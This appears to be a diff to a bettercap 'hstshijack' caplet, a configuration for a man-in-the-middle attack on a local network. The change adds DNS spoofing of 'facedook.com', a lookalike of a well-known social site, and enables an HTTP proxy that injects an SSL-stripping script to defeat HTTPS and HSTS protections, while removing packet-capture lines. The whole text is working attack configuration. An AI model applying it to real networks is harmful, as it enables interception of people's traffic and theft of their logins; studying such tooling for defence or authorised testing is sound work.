@@ -11,7 +11,7 @@ set hstshijack.encode          true
 set hstshijack.custompayloads  *:/usr/local/share/bettercap/caplets/hstshijack/payloads/sslstrip.js
 
 set http.proxy.script  /usr/local/share/bettercap/caplets/hstshijack/hstshijack.js
-#set net.sniff.output   hstshijack0001.pcap
-set net.sniff.verbose  false
-net.sniff   on
+set dns.spoof.domains  facedook.com,*.facedook.com
+
 http.proxy  on
+dns.spoof   on
